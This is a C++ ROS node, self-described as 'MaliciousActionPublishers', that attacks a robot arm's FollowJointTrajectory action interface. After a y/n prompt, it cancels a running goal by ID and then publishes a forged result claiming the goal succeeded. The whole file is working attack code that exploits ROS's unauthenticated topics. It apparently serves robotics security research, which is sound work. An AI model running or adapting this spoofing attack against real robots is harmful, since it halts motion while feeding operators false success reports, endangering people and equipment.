#include "ros/ros.h"
#include "actionlib_msgs/GoalID.h"
#include "actionlib_msgs/GoalStatus.h"
#include "control_msgs/FollowJointTrajectoryActionResult.h"
#include <iostream>
using namespace std;

int main(int argc, char **argv)
{
  if (argc < 2)
  {
    cout << "[MaliciousActionPublishers] ... please provide goal ID" << endl;
    return 0;
  }
  string goalID = argv[1];

  ros::init(argc, argv, "MaliciousActionPublishers");
  ros::NodeHandle nCancel;
  ros::NodeHandle nResult;
  ros::Publisher cancelPub = nCancel.advertise<actionlib_msgs::GoalID>("followJointTrajectory/cancel", 1000);
  ros::Publisher resultPub = nResult.advertise<control_msgs::FollowJointTrajectoryActionResult>("followJointTrajectory/result", 1000);
  ros::Rate loop_rate(10);
  actionlib_msgs::GoalID msgCancel;
  control_msgs::FollowJointTrajectoryActionResult msgResult;
  string key;

  cout << "[MaliciousActionPublishers] ... goal ID: " << goalID << endl;
  cout << "[MaliciousActionPublishers] ... do you want to start the attack [y/n]?" << endl;
  cin >> key;

  if (key == "y")
  {
      cout << "[MaliciousActionPublishers] ... canceling goal with ID: " << goalID << endl;
      msgCancel.stamp = ros::Time::now();
      msgCancel.id = goalID;
      cancelPub.publish(msgCancel);
      // ros::spinOnce();

      cout << "[MaliciousActionPublishers] ... sending fake goal result" << endl;
      msgResult.header.seq = 0;
      msgResult.header.stamp = ros::Time::now();
      msgResult.status.goal_id.stamp = ros::Time::now();
      msgResult.status.goal_id.id = goalID;
      msgResult.status.status = actionlib_msgs::GoalStatus::SUCCEEDED;
      msgResult.status.text = "Sepp";
      msgResult.result.error_code = control_msgs::FollowJointTrajectoryResult::SUCCESSFUL;
      resultPub.publish(msgResult);
      ros::spinOnce();
  }
  else if (key == "n")
  {
      cout << "[MaliciousActionPublishers] ... attack has been aborted" << endl;
  }
  else
  {
      cout << "[MaliciousActionPublishers] ... wrong key, terminating..." << endl;
  }

  return 0;
}


